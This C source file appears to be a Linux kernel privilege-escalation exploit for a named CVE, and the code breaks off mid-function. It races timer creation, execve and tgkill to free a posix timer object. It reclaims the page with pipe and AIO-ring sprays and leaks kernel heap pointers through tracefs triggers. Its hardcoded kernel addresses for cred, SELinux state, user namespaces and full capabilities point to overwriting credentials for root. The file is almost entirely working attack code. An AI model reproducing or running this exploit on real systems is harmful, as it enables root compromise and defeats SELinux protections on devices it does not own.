/* Park a CVE-2026-98260 zombie, reclaim its timer page with the pipe+AIO
 * path, plant an rb node, and reap. Fail closed: no waitpid unless the
 * filemap line count proves which ring owns the node page.
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define CPU0_TRACE TRACE "/per_cpu/cpu0/trace"
#define PAGE_OFFSET UINT64_C(0xffffff8000000000)
#define TIMER_LINK_109 UINT64_C(0xffffffc0803e005c)
#define CRED_LINK_109  UINT64_C(0xffffffc080147378)
#define TIMER_LINK_115 UINT64_C(0xffffffc0803e1fd0)
#define CRED_LINK_115  UINT64_C(0xffffffc08014cd90)
#define SELINUX_LINK UINT64_C(0xffffffc08299a6f0)
#define LINK_USER_NS UINT64_C(0xffffffc0827110e0)
#define LINK_ROOT_USER UINT64_C(0xffffffc082711390)
#define LINK_GROUPS UINT64_C(0xffffffc082712a48)
#define LINK_UCOUNTS UINT64_C(0xffffffc082712f08)
#define FULLCAP UINT64_C(0x1ffffffffff)
#define TASK_CRED_DEFAULT 0x908
#define KITIMER_NODE_DEFAULT 0xe0

static uint64_t g_slide;
static uint64_t g_timer_link = TIMER_LINK_115;
static uint64_t g_cred_link = CRED_LINK_115;
static uint64_t g_selinux_link = SELINUX_LINK;
static uint64_t g_user_ns = LINK_USER_NS;
static uint64_t g_root_user = LINK_ROOT_USER;
static uint64_t g_groups = LINK_GROUPS;
static uint64_t g_ucounts = LINK_UCOUNTS;
static unsigned g_kitimer_node = KITIMER_NODE_DEFAULT;
static unsigned g_kitimer_size = 0x180;
static unsigned g_task_cred = TASK_CRED_DEFAULT;
static unsigned g_cred_size = 0xb8;
static unsigned g_slab_objects = 21;
static unsigned g_slab_pages = 2;
static unsigned g_task_size = 5248;
static const char *g_profile = "115";
static int g_allow_zero_slide;
static int g_skip_selinux;
static int g_debug_task;
static int g_padding_timers = 4096;

static int set_kernel_profile(const char *profile)
{
	if (!strcmp(profile, "109")) {
		g_profile = "109";
		g_timer_link = TIMER_LINK_109;
		g_cred_link = CRED_LINK_109;
		g_kitimer_node = 0xe0;
		g_kitimer_size = 0x180;
		g_task_cred = 0x908;
		g_cred_size = 0xb8;
		g_slab_objects = 21;
		g_slab_pages = 2;
		return 0;
	}
	if (!strcmp(profile, "115")) {
		g_profile = "115";
		g_timer_link = TIMER_LINK_115;
		g_cred_link = CRED_LINK_115;
		g_kitimer_node = 0xe0;
		g_kitimer_size = 0x180;
		g_task_cred = 0x908;
		g_cred_size = 0xb8;
		g_slab_objects = 21;
		g_slab_pages = 2;
		return 0;
	}
	return -1;
}

static uint64_t slide_addr(uint64_t link)
{
	return link + g_slide;
}
#define NFILL 42
#define NFLUSH 2048
#define MAX_PADDING_TIMERS 8192
#define MAX_RINGS 9000
#define MAX_PIPES 400
#define NVMA 50000
#define F_SETPIPE_SZ 1031
#ifndef WNOWAIT
#define WNOWAIT 0x01000000
#endif

static _Atomic int g_go;
static _Atomic int g_stop;
static _Atomic int g_lockers;
static _Atomic int g_in_mprotect;
static _Atomic int g_exec_tid;
static _Atomic int g_mprotect_reported;
static void *g_vmas;
static size_t g_vmalen;

struct ipc {
	atomic_int phase;
	atomic_int exec_ready;
	int helpers[4];
	int nhelpers;
};
static struct ipc *ipc;

static uint64_t g_all[16384];
static int g_all_n;
static int g_pipes[MAX_PIPES][2];
static int g_npipes;
static uint64_t *g_ctx;
static int g_nrings;

static void on_alarm(int sig)
{
	(void)sig;
}

static int write_file_mode(const char *path, const char *text, int extra)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | extra);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int write_file(const char *path, const char *text)
{
	return write_file_mode(path, text, 0);
}

static int trigger_cmd(const char *text)
{
	if (!write_file(TRIGGER, text))
		return 0;
	return errno == EEXIST ? 0 : -1;
}

static int kick_rss(void)
{
	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
		return -1;
	if (page != MAP_FAILED) {
		((volatile unsigned char *)page)[0] = 1;
		munmap(page, 4096);
	}
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	return 0;
}

static void disarm(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static void quiet_reclaim_trace(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:mm_page_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static int trace_off_on(void)
{
	if (write_file(TRACE "/tracing_on", "0\n") ||
	    write_file_mode(TRACE "/trace", "", O_TRUNC))
		return -1;
	return write_file(TRACE "/tracing_on", "1\n");
}

static uint64_t object_pfn(uint64_t ptr)
{
	return ((ptr & ~UINT64_C(0xfff)) - PAGE_OFFSET) >> 12;
}

static uint64_t g_watch[32768];
static int g_nwatch;

static int cmp_u64(const void *a, const void *b)
{
	uint64_t x = *(const uint64_t *)a;
	uint64_t y = *(const uint64_t *)b;
	return (x > y) - (x < y);
}

static void build_watch(void)
{
	int w = 0;
	g_nwatch = 0;
	for (int i = 0; i < g_all_n && g_nwatch + 2 < (int)(sizeof(g_watch) / sizeof(g_watch[0])); i++) {
		g_watch[g_nwatch++] = object_pfn(g_all[i] + g_kitimer_node);
		g_watch[g_nwatch++] = object_pfn(g_all[i]) & ~UINT64_C(1);
	}
	qsort(g_watch, (size_t)g_nwatch, sizeof(g_watch[0]), cmp_u64);
	for (int i = 0; i < g_nwatch; i++) {
		if (w && g_watch[w - 1] == g_watch[i])
			continue;
		g_watch[w++] = g_watch[i];
	}
	g_nwatch = w;
}

static int watch_has(uint64_t pfn)
{
	return bsearch(&pfn, g_watch, (size_t)g_nwatch, sizeof(pfn), cmp_u64) != NULL;
}

static int cpu_count(void);

static int preflight_probe(void)
{
	struct sigevent event;
	struct itimerspec spec;
	timer_t timer;
	unsigned long ctx = 0;
	int sv[2] = { -1, -1 };
	int big = 16 << 20;
	int ok = 1;

	dprintf(STDOUT_FILENO, "[preflight] uid=%u euid=%u\n", getuid(), geteuid());
	dprintf(STDOUT_FILENO, "[preflight] tracing_trigger=%s\n",
		access(TRIGGER, W_OK) == 0 ? "writable" : "denied");

	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_SIGNAL;
	event.sigev_signo = SIGRTMIN;
	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &timer)) {
		dprintf(STDOUT_FILENO, "[preflight] timer_create: FAIL errno=%d\n", errno);
		ok = 0;
	} else {
		memset(&spec, 0, sizeof(spec));
		spec.it_value.tv_sec = 1;
		if (timer_settime(timer, 0, &spec, NULL))
			dprintf(STDOUT_FILENO, "[preflight] timer_settime: WARN errno=%d\n", errno);
		else
			dprintf(STDOUT_FILENO, "[preflight] timer_create: OK\n");
		timer_delete(timer);
	}

	if (syscall(SYS_io_setup, 1, &ctx)) {
		dprintf(STDOUT_FILENO, "[preflight] io_setup: FAIL errno=%d\n", errno);
		ok = 0;
	} else {
		dprintf(STDOUT_FILENO, "[preflight] io_setup: OK\n");
		syscall(SYS_io_destroy, ctx);
	}

	{
		FILE *slab = fopen("/proc/slabinfo", "re");
		char line[512];
		int found = 0;
		if (!slab) {
			dprintf(STDOUT_FILENO, "[preflight] slabinfo: SKIP errno=%d\n", errno);
		} else {
			while (fgets(line, sizeof(line), slab)) {
				char name[96];
				unsigned long active, total, objsize, objperslab, pagesperslab;
				if (sscanf(line, "%95s %lu %lu %lu %lu %lu", name, &active,
					   &total, &objsize, &objperslab, &pagesperslab) != 6)
					continue;
				if (strcmp(name, "posix_timers_cache") && strcmp(name, "posix_timers"))
					continue;
				found = 1;
				dprintf(STDOUT_FILENO,
					"[preflight] slab %s size=%lu objects=%lu pages=%lu\n",
					name, objsize, objperslab, pagesperslab);
				if (objsize != g_kitimer_size || objperslab != g_slab_objects || pagesperslab != g_slab_pages) {
					dprintf(STDOUT_FILENO, "[preflight] slab layout: FAIL\n");
					ok = 0;
				}
				break;
			}
			fclose(slab);
			if (!found)
				dprintf(STDOUT_FILENO, "[preflight] slabinfo: SKIP no posix_timers row\n");
		}
	}

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv)) {
		dprintf(STDOUT_FILENO, "[preflight] socketpair: FAIL errno=%d\n", errno);
		ok = 0;
	} else {
		setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
		setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
		dprintf(STDOUT_FILENO, "[preflight] unix_stream: OK\n");
		close(sv[0]);
		close(sv[1]);
	}

	if (write_file(TRACE "/buffer_size_kb", "64\n") ||
	    trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") ||
	    trigger_cmd("enable_event:kmem:mm_page_alloc\n") ||
	    trigger_cmd("enable_event:kmem:mm_page_free\n") ||
	    trace_off_on() || kick_rss()) {
		dprintf(STDOUT_FILENO, "[preflight] trace enable: FAIL errno=%d\n", errno);
		ok = 0;
	} else {
		char path[128];
		int fd = -1;
		for (int cpu = 0; cpu < cpu_count(); cpu++) {
			snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
			fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
			if (fd >= 0) {
				close(fd);
				break;
			}
		}
		if (fd < 0) {
			dprintf(STDOUT_FILENO, "[preflight] trace raw: FAIL errno=%d\n", errno);
			ok = 0;
		} else {
			dprintf(STDOUT_FILENO, "[preflight] trace raw: OK\n");
		}
	}
	disarm();
	dprintf(STDOUT_FILENO, "[preflight] RESULT=%s\n", ok ? "OK" : "FAIL");
	return ok ? 0 : 1;
}

static int pfn_in_line(const char *line, uint64_t pfn)
{
	const char *p = strstr(line, "pfn=0x");
	char *end = NULL;
	uint64_t got;
	if (!p)
		return 0;
	got = strtoull(p + 6, &end, 16);
	if (end == p + 6)
		return 0;
	return got == pfn;
}

static int trace_find_cpu(const char *kind, uint64_t pfn)
{
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			if (strstr(line, kind) && pfn_in_line(line, pfn)) {
				fclose(file);
				return cpu;
			}
		}
		fclose(file);
	}
	return -1;
}

static int trace_seen(const char *kind, uint64_t pfn)
{
	return trace_find_cpu(kind, pfn) >= 0;
}

static uint64_t parse_pfn(const char *line)
{
	const char *p = strstr(line, "pfn=0x");
	if (!p)
		return UINT64_MAX;
	return strtoull(p + 6, NULL, 16);
}

static int cpu_count(void)
{
	char buf[128];
	char *p;
	int fd, n = 0;
	ssize_t got;
	memset(buf, 0, sizeof(buf));
	fd = open("/sys/devices/system/cpu/present", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 8;
	got = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (got <= 0)
		return 8;
	for (p = buf; *p; ) {
		int v = 0;
		if (*p < '0' || *p > '9') {
			p++;
			continue;
		}
		while (*p >= '0' && *p <= '9')
			v = v * 10 + (*p++ - '0');
		if (v + 1 > n)
			n = v + 1;
	}
	if (n < 1)
		return 8;
	return n > 16 ? 16 : n;
}

static int g_socks[256][2];
static int g_nsocks;

static void close_socks(void)
{
	for (int i = 0; i < g_nsocks; i++) {
		close(g_socks[i][0]);
		close(g_socks[i][1]);
	}
	g_nsocks = 0;
}

static unsigned long drain_socks(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x42, sizeof(buf));
	g_nsocks = 0;
	for (int i = 0; i < 256 && total < (4UL << 30); i++) {
		int sz = 16 << 20;
		int wrote = 0;
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_socks[i]))
			break;
		setsockopt(g_socks[i][0], SOL_SOCKET, SO_SNDBUF, &sz, sizeof(sz));
		setsockopt(g_socks[i][1], SOL_SOCKET, SO_RCVBUF, &sz, sizeof(sz));
		if (fcntl(g_socks[i][0], F_SETFL, O_NONBLOCK)) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		while (wrote < (16 << 20)) {
			ssize_t n = write(g_socks[i][0], buf, sizeof(buf));
			if (n < 0)
				break;
			wrote += (int)n;
		}
		if (!wrote) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		total += (unsigned long)wrote;
		g_nsocks++;
	}
	dprintf(STDOUT_FILENO, "[sock] pairs=%d MiB=%lu\n", g_nsocks, total >> 20);
	return total;
}

static int pin_cpu(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

static unsigned long drain_pipes(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x41, sizeof(buf));
	g_npipes = 0;
	int cpus = cpu_count();
	for (int i = 0; i < MAX_PIPES && total < (80UL << 20); i++) {
		int cap, wrote = 0;
		pin_cpu(i % cpus);
		if (pipe(g_pipes[i]))
			break;
		cap = fcntl(g_pipes[i][1], F_SETPIPE_SZ, 1 << 20);
		if (cap < 0)
			cap = 65536;
		if (fcntl(g_pipes[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_pipes[i][0]);
			close(g_pipes[i][1]);
			break;
		}
		while (wrote < cap) {
			size_t chunk = sizeof(buf);
			ssize_t n;
			if (chunk > (size_t)(cap - wrote))
				chunk = (size_t)(cap - wrote);
			n = write(g_pipes[i][1], buf, chunk);
			if (n < 0) {
				if (errno == EAGAIN)
					break;
				close(g_pipes[i][0]);
				close(g_pipes[i][1]);
				dprintf(STDOUT_FILENO, "[drain] write errno=%d\n", errno);
				return total;
			}
			wrote += (int)n;
			total += (unsigned long)n;
		}
		g_npipes++;
	}
	dprintf(STDOUT_FILENO, "[drain] pipes=%d MiB=%lu\n", g_npipes, total >> 20);
	return total;
}

static int read_raw(uint8_t *buf, size_t cap, size_t *used)
{
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	alarm(1);
	while (*used + 4096 < cap) {
		ssize_t n = read(fd, buf + *used, cap - *used);
		if (n < 0) {
			if (errno == EINTR)
				break;
			close(fd);
			return -1;
		}
		if (n == 0)
			break;
		*used += (size_t)n;
	}
	alarm(0);
	close(fd);
	return 0;
}

static int collect_nth(int index, int *count, uint64_t *chosen)
{
	uint8_t *buf = malloc(8U << 20);
	size_t used = 0;
	uint8_t needle[8];
	uint64_t site = slide_addr(g_timer_link);
	int fd, n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	*chosen = 0;
	fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		free(buf);
		return -1;
	}
	alarm(2);
	while (used + 4096 < (8U << 20)) {
		ssize_t got = read(fd, buf + used, (8U << 20) - used);
		if (got <= 0)
			break;
		used += (size_t)got;
	}
	alarm(0);
	close(fd);
	for (size_t i = 0; i + 32 <= used; i++) {
		uint64_t got, ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 24, 8);
		if (got != site || req != g_kitimer_size || (ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		if (n < (int)(sizeof(g_all) / sizeof(g_all[0])))
			g_all[n] = ptr;
		*chosen = (n == index) ? ptr : *chosen;
		n++;
	}
	free(buf);
	*count = n;
	g_all_n = n < (int)(sizeof(g_all) / sizeof(g_all[0]))
		? n : (int)(sizeof(g_all) / sizeof(g_all[0]));
	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
		n, *chosen, used);
	return (n > index && *chosen) ? 0 : -1;
}

static int collect_site(uint64_t site, uint64_t bytes, uint64_t *ptrs, int cap)
{
	uint8_t *buf = malloc(4U << 20);
	size_t used = 0;
	uint8_t needle[8];
	int n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	if (read_raw(buf, 4U << 20, &used)) {
		free(buf);
		return -1;
	}
	for (size_t i = 0; i + 32 <= used && n < cap; i++) {
		uint64_t got, ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 24, 8);
		if (got != site || req != bytes)
			continue;
		if ((ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		ptrs[n++] = ptr;
	}
	free(buf);
	return n;
}

static int text_has_comm(const char *comm)
{
	FILE *file = fopen(CPU0_TRACE, "r");
	char line[768];
	int n = 0;
	if (!file)
		return -1;
	while (fgets(line, sizeof(line), file)) {
		if (strstr(line, "do_timer_create") && strstr(line, comm))
			n++;
	}
	fclose(file);
	return n;
}

static int prepare_vmas(void)
{
	long page = 4096;
	int fd = (int)syscall(SYS_memfd_create, "v", MFD_CLOEXEC);
	void *base;
	if (fd < 0 || ftruncate(fd, page))
		return -1;
	g_vmalen = (size_t)NVMA * (size_t)page;
	base = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED)
		return -1;
	for (int i = 0; i < NVMA; i++) {
		void *at = (char *)base + (size_t)i * (size_t)page;
		if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at)
			return -1;
	}
	close(fd);
	g_vmas = base;
	return 0;
}

#define HELPER_STACK (1 << 20)

static int spawn_helper(int (*fn)(void *), void *arg)
{
	void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	int pid;
	if (stack == MAP_FAILED)
		return -1;
	pid = clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
	return pid;
}

static int locker_fn(void *arg)
{
	int prot = PROT_NONE;
	(void)arg;
	while (!atomic_load_explicit(&g_go, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	atomic_fetch_add_explicit(&g_lockers, 1, memory_order_release);
	while (!atomic_load_explicit(&g_stop, memory_order_acquire)) {
		int rc;
		atomic_store_explicit(&g_in_mprotect, 1, memory_order_release);
		rc = mprotect(g_vmas, g_vmalen, prot);
		atomic_store_explicit(&g_in_mprotect, 0, memory_order_release);
		if (rc && atomic_exchange_explicit(&g_mprotect_reported, 1, memory_order_relaxed) == 0)
			dprintf(STDOUT_FILENO, "[locker] mprotect errno=%d\n", errno);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	return 0;
}

static int killer_fn(void *arg)
{
	int tgid = (int)(intptr_t)arg;
	int old;
	while (!(old = atomic_load_explicit(&g_exec_tid, memory_order_acquire))) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	while (!atomic_load_explicit(&ipc->exec_ready, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	for (;;) {
		if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH)
			break;
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
	}
	syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	dprintf(STDOUT_FILENO, "[killer] SIGKILL tgid=%d old=%d errno=%d\n",
		tgid, old, errno);
	return 0;
}

static void *exec_fn(void *arg)
{
	struct sigevent event;
	struct itimerspec spec;
	timer_t id;
	char *argv[] = { (char *)"uaf_plant", (char *)"--exec-ok", NULL };
	(void)arg;
	struct sigevent armed_event;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	memset(&armed_event, 0, sizeof(armed_event));
	armed_event.sigev_notify = SIGEV_SIGNAL;
	armed_event.sigev_signo = SIGRTMIN;
	memset(&spec, 0, sizeof(spec));
	spec.it_value.tv_sec = 3600;
	if (pin_cpu(0))
		_exit(116);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(124);
		sched_yield();
	}
	timer_t armed;
	timer_t *padding = NULL;
	int made = 0;
	if (g_padding_timers > 0) {
		padding = calloc((size_t)g_padding_timers, sizeof(*padding));
		if (!padding)
			_exit(121);
		for (int i = 0; i < g_padding_timers; i++) {
			if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &padding[i]))
				_exit(121);
		}
	}
	for (int i = 0; i < 2048; i++) {
		timer_t extra;
		if (timer_create(CLOCK_THREAD_CPUTIME_ID,
				 i == 1024 ? &armed_event : &event, &extra))
			_exit(120);
		if (i == 1024) {
			armed = extra;
			if (timer_settime(armed, 0, &spec, NULL))
				_exit(120);
		}
		made++;
	}
	for (int i = 0; i < g_padding_timers; i++)
		timer_delete(padding[i]);
	free(padding);
	if (made < 2048)
		_exit(120);
	atomic_store_explicit(&g_exec_tid, (int)syscall(SYS_gettid), memory_order_release);
	atomic_store_explicit(&ipc->phase, 3, memory_order_release);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 4) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(125);
		sched_yield();
	}
	atomic_store_explicit(&g_go, 1, memory_order_release);
	while (atomic_load_explicit(&g_in_mprotect, memory_order_acquire) == 0) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(123);
		sched_yield();
	}
	while (!atomic_load_explicit(&ipc->exec_ready, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(123);
		sched_yield();
	}
	dprintf(STDOUT_FILENO, "[exec] begin tid=%ld\n", (long)syscall(SYS_gettid));
	execve("/proc/self/exe", argv, NULL);
	_exit(122);
}

static int child_race(void)
{
	pthread_t exec_thread;
	sigset_t block;
	int tgid = (int)getpid();
	(void)setpgid(0, 0);
	sigemptyset(&block);
	sigaddset(&block, SIGRTMIN);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (prepare_vmas())
		_exit(110);
	dprintf(STDOUT_FILENO, "[child] vmas ready pid=%d\n", getpid());
	if (pin_cpu(1))
		_exit(115);
	for (int i = 0; i < 3; i++) {
		int pid = spawn_helper(locker_fn, NULL);
		if (pid < 0)
			_exit(111);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	{
		int pid = spawn_helper(killer_fn, (void *)(intptr_t)tgid);
		if (pid < 0)
			_exit(112);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	if (pthread_create(&exec_thread, NULL, exec_fn, NULL))
		_exit(114);
	atomic_store_explicit(&ipc->phase, 1, memory_order_release);
	for (;;)
		pause();
}

static int wait_phase(int want)
{
	for (int i = 0; i < 600; i++) {
		struct timespec pause = { .tv_nsec = 50000000 };
		if (atomic_load_explicit(&ipc->phase, memory_order_acquire) >= want)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}

static void stop_helpers(void)
{
	if (!ipc)
		return;
	for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
		if (ipc->helpers[i] > 0)
			kill(ipc->helpers[i], SIGKILL);
	}
}

/* A page miss leaves the timer node in a parked zombie.  The helper clones
 * can be reaped, but the victim itself must remain unreaped.  Keeping those
 * two cases separate lets the caller start a fresh victim without taking the
 * next process group's cred-helper down with it. */
static void reap_helpers_only(void)
{
	if (!ipc)
		return;
	for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
		pid_t helper = ipc->helpers[i];
		if (helper > 0) {
			int st;
			kill(helper, SIGKILL);
			while (waitpid(helper, &st, 0) < 0 && errno == EINTR) {}
		}
	}
	ipc->nhelpers = 0;
}

static void cleanup_uaf_group(pid_t child, int *status_out)
{
	int status = 0;
	int helpers;
	if (!ipc)
		return;
	helpers = ipc->nhelpers;
	if (child > 0) {
		(void)kill(child, SIGKILL);
	}
	stop_helpers();
	if (child > 0) {
		while (waitpid(child, &status, 0) < 0 && errno == EINTR) {}
		for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
			int helper_status;
			pid_t helper = ipc->helpers[i];
			if (helper <= 0 || helper == child)
				continue;
			while (waitpid(helper, &helper_status, 0) < 0 && errno == EINTR) {}
		}
	}
	ipc->nhelpers = 0;
	dprintf(STDOUT_FILENO, "[uaf] cleanup child=%d helpers=%d\n",
		(int)child, helpers);
	if (status_out)
		*status_out = status;
}

#define UAF_SAFE_RETRY (-1)
#define UAF_POISONED (-2)

static int wait_zombie(pid_t child, int *status_out)
{
	for (int i = 0; i < 400; i++) {
		siginfo_t info;
		struct timespec pause = { .tv_nsec = 50000000 };
		memset(&info, 0, sizeof(info));
		if (waitid(P_PID, (id_t)child, &info, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (info.si_pid == child) {
			*status_out = info.si_status;
			return info.si_code;
		}
		nanosleep(&pause, NULL);
	}
	return 0;
}

static int line_has_pfn(const char *line, uint64_t pfn)
{
	char exact[40];
	char *hit;
	int n = snprintf(exact, sizeof(exact), "pfn=0x%" PRIx64, pfn);
	if (n <= 0)
		return 0;
	hit = strstr(line, exact);
	if (!hit)
		return 0;
	{
		char end = hit[n];
		if ((end >= '0' && end <= '9') ||
		    (end >= 'a' && end <= 'f') ||
		    (end >= 'A' && end <= 'F'))
			return 0;
	}
	return 1;
}

static int raw_has_ptr(uint64_t ptr)
{
	uint8_t needle[8];
	int cpu;
	memcpy(needle, &ptr, 8);
	for (cpu = 0; cpu < 8; cpu++) {
		char path[128];
		uint8_t *buf = malloc(8U << 20);
		size_t used = 0;
		int fd;
		if (!buf)
			return -1;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_CLOEXEC);
		if (fd >= 0) {
			alarm(2);
			while (used + 4096 < (8U << 20)) {
				ssize_t n = read(fd, buf + used, (8U << 20) - used);
				if (n < 0) {
					if (errno == EINTR)
						break;
					break;
				}
				if (n == 0)
					break;
				used += (size_t)n;
			}
			alarm(0);
			close(fd);
		}
		dprintf(STDOUT_FILENO, "[freeobj] cpu%d raw_bytes=%zu\n", cpu, used);
		for (size_t i = 0; i + 8 <= used; i++) {
			if (!memcmp(buf + i, needle, 8)) {
				free(buf);
				dprintf(STDOUT_FILENO, "[freeobj] ptr on cpu%d raw_bytes=%zu\n",
					cpu, used);
				return 1;
			}
		}
		free(buf);
	}
	return 0;
}

static int flush_timers(void)
{
	struct sigevent event;
	timer_t *ids = calloc(NFLUSH, sizeof(*ids));
	int created = 0;
	if (!ids)
		return -1;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < NFLUSH; i++) {
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &ids[i]))
			break;
		created++;
	}
	for (int i = 0; i < created; i++)
		timer_delete(ids[i]);
	free(ids);
	dprintf(STDOUT_FILENO, "[flush] deleted=%d\n", created);
	return created >= 256 ? 0 : -1;
}

#define MAX_CPU 16
#define PER_CPU_RINGS 512
static uint64_t g_cpu_ctx[MAX_CPU][PER_CPU_RINGS];
static int g_cpu_n[MAX_CPU];
static int g_cpu_lines[MAX_CPU];
static int g_hit_cpu = -1;
static int g_hit_index = -1;

static void destroy_rings(void)
{
	for (int cpu = 0; cpu < MAX_CPU; cpu++) {
		for (int i = 0; i < g_cpu_n[cpu]; i++)
			syscall(SYS_io_destroy, g_cpu_ctx[cpu][i]);
		g_cpu_n[cpu] = 0;
	}
	g_nrings = 0;
}

static void *spray_cpu(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	struct timespec pause = { .tv_nsec = 400000000 };
	if (pin_cpu(cpu))
		return NULL;
	while (!atomic_load_explicit(&g_stop, memory_order_acquire) &&
	       g_cpu_n[cpu] < PER_CPU_RINGS) {
		int batch = 0;
		for (int i = 0; i < 32 && g_cpu_n[cpu] < PER_CPU_RINGS; i++) {
